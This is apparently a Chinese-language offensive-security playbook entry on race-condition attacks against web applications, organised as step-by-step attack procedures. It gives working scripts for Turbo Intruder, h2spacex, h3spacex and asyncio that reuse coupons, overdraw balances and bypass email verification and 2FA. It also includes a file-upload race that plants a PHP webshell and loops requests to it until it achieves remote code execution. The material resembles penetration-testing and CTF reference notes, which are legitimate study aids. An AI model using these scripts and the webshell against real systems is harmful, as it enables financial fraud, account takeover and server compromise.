---
category: web
tags: [race condition, 竞争条件, toctou, single-packet attack, 单包攻击, limit overrun, 限额绕过, turbo intruder, h2spacex, concurrency, 并发, connection pool, 连接池, hidden substate, 隐藏子状态, double spending, 双花, http2, http3, quic]
triggers: [race condition, 竞争条件, 并发, concurrency, 重复提交, 多次使用, 优惠券, coupon, discount, 积分, credit, limit overrun, double spending, toctou, time of check, single packet, 单包攻击, turbo intruder, 同时请求, simultaneous, 重复兑换, redeem multiple, 余额, balance, withdraw, 2FA bypass]
related: [file_upload, jwt, command_injection]
---

# Race Condition（竞争条件）

## 什么时候用

- 应用对某操作有**次数/额度限制**（优惠券只能用一次、余额不能透支、积分兑换上限）
- 存在**先检查后执行**（TOCTOU）逻辑：检查权限→执行操作之间有时间窗口
- **注册/密码重置/邮箱验证**等流程中数据库写入分多步完成
- **文件上传**后有短暂窗口可在安全检查/删除前访问
- **2FA**在会话创建后才强制执行，存在极短的无 MFA 窗口
- **OAuth2** `authorization_code` 可被多次兑换为 Token
- **密码重置 Token** 基于时间戳生成，同时请求可获得相同 Token

## 前提条件

1. 目标操作在服务端**非原子执行**（检查与执行之间有间隙）
2. 能向同一端点/多个端点**并发发送请求**
3. HTTP/2 单包攻击需要目标支持 HTTP/2；HTTP/1.1 需要 Last-Byte Sync
4. Turbo Intruder 或自定义脚本（h2spacex / asyncio）可用
5. 部分场景需要**多个 Session Token**以绕过框架级会话锁（如 PHP session handler）

## 攻击步骤（含代码）

### 1. HTTP/2 单包攻击（Single-Packet Attack）

核心思路：HTTP/2 允许在单个 TCP 连接上多路复用，将多个请求的所有帧塞进**一个 TCP 包**发送，服务端几乎同时处理。

**适用场景**：目标支持 HTTP/2，需要极高的请求同步精度（< 1ms 差异）。

**Turbo Intruder 实现（单端点 — 如重复使用优惠券）**：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # HTTP/2 单包模式

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Turbo Intruder 实现（多端点 — 如注册+确认竞争）**：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: target.com
Cookie: phpsessionid=XXXX
Content-Length: 0

'''

    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'user' + currentAttempt
        engine.queue(target.req, username, gate=currentAttempt)
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        engine.openGate(currentAttempt)
```

> **注意**：`Engine.BURP2` 仅用于 HTTP/2。HTTP/1.1 目标需改用 `Engine.THREADED` 或 `Engine.BURP`。

**Burp Repeater 简易方式**：选中多个请求 Tab → 右键 → **Send group in parallel**。

- limit-overrun：同一请求复制 50 份加入分组
- connection warming：在分组开头加几个无害请求预热连接
- multi-endpoint：先发触发隐藏状态的请求，紧跟 50 个利用该状态的请求

### 2. HTTP/1.1 Last-Byte Synchronization

当目标仅支持 HTTP/1.1 时使用。原理：预发送 20-30 个请求的大部分数据，保留最后一个字节不发，然后同时释放所有最后字节。

**步骤**：

1. 发送每个请求的 Header + Body（保留最后 1 字节），不结束流
2. 暂停 100ms
3. 禁用 `TCP_NODELAY`，利用 Nagle 算法将末尾帧批量合并
4. 发送 ping 预热连接
5. 同时释放所有保留的最后字节 → 它们会合并到同一个 TCP 包

可通过 Wireshark 验证是否合并到单个包。

### 3. HTTP/3 Last-Frame Synchronization (QUIC)

HTTP/3 基于 QUIC（UDP），无法利用 TCP 的 Nagle 合并。需要将多个 QUIC stream 的 FIN 帧合并到同一个 UDP 数据报。

**工具**：[H3SpaceX](https://pkg.go.dev/github.com/nxenon/h3spacex)（Go 库）

```go
package main
import (
    "crypto/tls"
    "context"
    "time"
    "github.com/nxenon/h3spacex"
    h3 "github.com/nxenon/h3spacex/http3"
)
func main() {
    tlsConf := &tls.Config{InsecureSkipVerify: true, NextProtos: []string{h3.NextProtoH3}}
    quicConf := &quic.Config{MaxIdleTimeout: 10 * time.Second}
    conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)

    var reqs []*http.Request
    for i := 0; i < 50; i++ {
        r, _ := h3.GetRequestObject("https://target/apply", "POST",
            map[string]string{"Cookie": "sess=...", "Content-Type": "application/json"},
            []byte(`{"coupon":"SAVE"}`))
        reqs = append(reqs, &r)
    }
    // 保留最后 1 字节, sleep 150ms, 自动设 Content-Length
    h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```

**限制**：受服务端 QUIC `max_streams` 参数约束。若值较低，需打开多个 H3 连接分散竞争。

### 4. H2SpaceX（Python HTTP/2 单包攻击）

适用于需要精确控制帧发送的 Python 脚本场景。

```python
from h2spacex import H2OnTlsConnection

h2_conn = H2OnTlsConnection(hostname="target.com", port_number=443)
h2_conn.setup_connection()

N = 100
stream_ids = h2_conn.generate_stream_ids(number_of_streams=N)
all_headers_frames = []
all_data_frames = []

for i in range(N):
    headers_string = """Cookie: session=XXX
Content-Type: application/x-www-form-urlencoded
Content-Length: 20"""
    body = "code=DISCOUNT123"
    hf, df = h2_conn.create_single_packet_http2_post_request_frames(
        method='POST', headers_string=headers_string,
        scheme='https', stream_id=stream_ids[i],
        authority="target.com", body=body, path='/apply-coupon')
    all_headers_frames.append(hf)
    all_data_frames.append(df)

h2_conn.send_bytes(b''.join(bytes(h) for h in all_headers_frames))
import time; time.sleep(0.1)
h2_conn.send_ping_frame()
h2_conn.send_bytes(b''.join(bytes(d) for d in all_data_frames))

from h2spacex import h2_frames
resp = h2_conn.read_response_from_socket(_timeout=3)
parser = h2_frames.FrameParser(h2_connection=h2_conn)
parser.add_frames(resp)
parser.show_response_of_sent_requests()
h2_conn.close_connection()
```

### 5. Python asyncio（快速暴力法）

不追求极致同步精度时的简单方案：

```python
import asyncio
import httpx

async def redeem(client):
    resp = await client.post(
        'http://target.com/apply-coupon',
        cookies={"session": "XXX"},
        data={"code": "DISCOUNT123"})
    return resp.status_code, resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = [asyncio.ensure_future(redeem(client)) for _ in range(30)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            print(r)

asyncio.run(main())
```

### 6. IP 分片扩展（First-Sequence Sync）

突破单包 1500 字节 MTU 限制：利用 IP 层分片将单个包拆分为多个 IP 包，乱序发送以阻止服务端提前重组，直到所有分片到达后同时处理。可在约 166ms 内发送 **10,000 个请求**。

工具：[first-sequence-sync](https://github.com/Ry0taK/first-sequence-sync)

⚠️ 受 `SETTINGS_MAX_CONCURRENT_STREAMS` 限制：Apache(100)、Nginx(128)、Go(250)。NodeJS 和 nghttp2 无限制。

## 常见坑

1. **PHP Session 锁**：PHP 默认按 session 串行化请求。解决：每个并发请求使用**不同的 session token**
2. **HTTP 版本不匹配**：用 `Engine.BURP2` 打 HTTP/1.1 目标不会报错但不生效。确认目标 HTTP 版本后选择对应引擎
3. **连接预热不足**：第一批请求延迟高于后续，导致同步失败。在真正攻击前发送几个无害请求预热
4. **服务端限流**：WAF/Rate Limit 会阻断并发。可通过大量 dummy 请求故意触发服务端排队延迟，反而有利于单包同时到达
5. **TCP_NODELAY 未禁用**：Last-Byte Sync 时若开启 TCP_NODELAY，每个字节独立发送，无法合并
6. **并发数不够**：优惠券竞争通常需要 20-50 并发才有较高成功率，单次 2 请求可能不够
7. **单包大小限制**：HTTP/2 单包受 MTU(~1500B) 和 `MAX_CONCURRENT_STREAMS` 双重限制
8. **Turbo Intruder 时间戳为负**：结果中出现负时间戳是正常现象，说明服务端在请求完全发出前已响应，证明竞争成功

## 变体

### TOCTOU / Limit-overrun（限额绕过）

最经典的竞争条件。应用先检查「优惠券是否已使用」，再标记为「已使用」。窗口期内多个请求都通过检查。

**典型场景**：
- 优惠券/折扣码/礼品卡重复兑换
- 余额透支（提现/转账超过余额）
- 投票/评分多次提交
- CAPTCHA 验证码复用
- 暴力破解绕过 Rate Limit

### Hidden Substates（隐藏子状态）

多步写入操作中，中间状态可被利用：

- **邮箱验证绕过**：注册用户时先写 username/password，再写 confirmation token。在 token 为 null 的短暂窗口内用空 token 确认：`POST /confirm?token[]=`
- **邮箱接管**：同时修改邮箱+触发验证，验证邮件可能发到旧邮箱（变量已被旧值填充）
- **2FA 绕过**：会话创建后才设置 `enforce_mfa=True`，极短窗口内直接访问受保护资源

```python
# 有漏洞的伪代码
session['userid'] = user.userid
if user.mfa_enabled:
    session['enforce_mfa'] = True  # ← 此行执行前存在窗口
```

### 文件上传竞争

上传 webshell → 服务端安全检查/杀毒/删除。在检查完成前的窗口访问已上传文件。

**攻击模式**：
1. 线程 A：循环上传 webshell
2. 线程 B：循环请求 webshell URL 执行命令
3. 只要有一次线程 B 在删除前命中，即可 RCE

```python
import asyncio, httpx

async def upload_loop(client, url):
    for _ in range(200):
        files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
        await client.post(url + '/upload', files=files)

async def trigger_loop(client, url):
    for _ in range(200):
        r = await client.get(url + '/uploads/shell.php?c=id')
        if 'uid=' in r.text:
            print(f"[+] RCE: {r.text}")
            return

async def main():
    async with httpx.AsyncClient() as c:
        await asyncio.gather(upload_loop(c, URL), trigger_loop(c, URL))
```

### 数据库竞争（Double Spending）

数据库事务隔离级别不够时，多个并发请求各自读到相同余额后分别扣减。

**检测方式**：用单包攻击同时发送多个扣款/兑换请求，检查最终余额是否被多次扣减。

### 时间敏感攻击（Timestamp Token）

密码重置 Token 基于时间戳生成 → 同时发起多个重置请求 → 获得相同 Token → 可重置他人密码。

用单包攻击同时为自己和目标发送密码重置请求，对比收到的 Token 是否相同。

### OAuth2 竞争

- **authorization_code 多次兑换**：用户授权后拿到的 code 在短窗口内被多次兑换为 AT/RT，撤销权限后仍有多组有效 Token
- **Refresh Token 竞争**：用有效 RT 并发刷新，产生多组 AT/RT，撤销后仍有存活的

### 连接池并发（客户端侧 XS-Leak）

利用浏览器对同一 origin 的**连接数上限**（Chrome 默认 6 个/origin）进行信息泄露。

**原理**：
1. 注入大量 `<img src=/resource>` 占满目标 origin 的连接池
2. 从攻击者页面计时请求同一 origin 的资源
3. 若注入的图片正在加载（占用连接），计时请求更慢 → 泄露页面内容

这是一种侧信道攻击，常用于逐字符泄露 flag。

### WebSocket 竞争

WebSocket 的 race condition 需要并行建立多个 WS 连接同时发送消息。

**工具**：
- [WS_RaceCondition_PoC](https://github.com/redrays-io/WS_RaceCondition_PoC)（Java）
- Burp WebSocket Turbo Intruder：用 `THREADED` 引擎多连接并发

## 相关技术

- [[file_upload]]：文件上传竞争是 race condition 最常见的 RCE 路径
- [[jwt]]：JWT Token 刷新逻辑可能存在竞争
- [[command_injection]]：通过文件上传竞争获得的 webshell 常用于命令注入
